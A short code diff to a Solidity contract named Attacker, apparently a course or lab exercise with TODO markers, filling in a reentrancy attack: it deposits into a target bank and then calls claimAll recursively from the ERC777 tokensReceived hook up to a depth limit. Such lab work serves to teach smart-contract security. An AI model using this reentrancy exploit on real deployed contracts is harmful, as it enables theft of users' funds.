@@ -43,16 +43,8 @@ contract Attacker is AccessControl, IERC777Recipient {
 
       require( address(bank) != address(0), "Target bank not set" );
 		//TODO: YOUR CODE TO START ATTACK GOES HERE
-
-		// depth == 0 means that this is the first time the attack function is called
-		if (depth == 0){
-			emit Deposit (amt);
-			bank.deposit{value: amt}();
-		}
-
-		if (depth != 0){
-			bank.claimAll();
-		} 
+		bank.deposit{value: amt}();
+		bank.claimAll();
 		
 	}
 
@@ -82,11 +74,13 @@ contract Attacker is AccessControl, IERC777Recipient {
 	) external {
 		//Todo: YOUR CODE TO RECURSE GOES HERE
 
-		if (depth < max_depth){
-			depth += 1;
+		if (depth < max_depth) {
+			depth++;
 			emit Recurse(depth);
-			attack(amount);
+			bank.claimAll();
 		}
+
+		
 
 	}
 
